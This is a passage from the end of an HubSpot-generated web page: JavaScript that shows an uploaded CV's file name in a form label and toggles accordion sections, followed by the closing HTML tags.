   setTimeout(function() { 
        $('.send_your_cv .hs_upload .hs-input').change(function() {
    
        var filepath = this.value;
        var m = filepath.match(/([^\/\\]+)$/);
        var filename = m[1];
        $('.send_your_cv .hs_upload label').html(filename);
    });
   
    }, 2000);
              
  const items = document.querySelectorAll('.accordion button');

function toggleAccordion() {
  const itemToggle = this.getAttribute('aria-expanded');

  for (i = 0; i < items.length; i++) {
    items[i].setAttribute('aria-expanded', 'false');
  }

  if (itemToggle == 'false') {
    this.setAttribute('aria-expanded', 'true');
  }
}

items.forEach((item) => item.addEventListener('click', toggleAccordion));




   
});

</script>



    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

</body></html>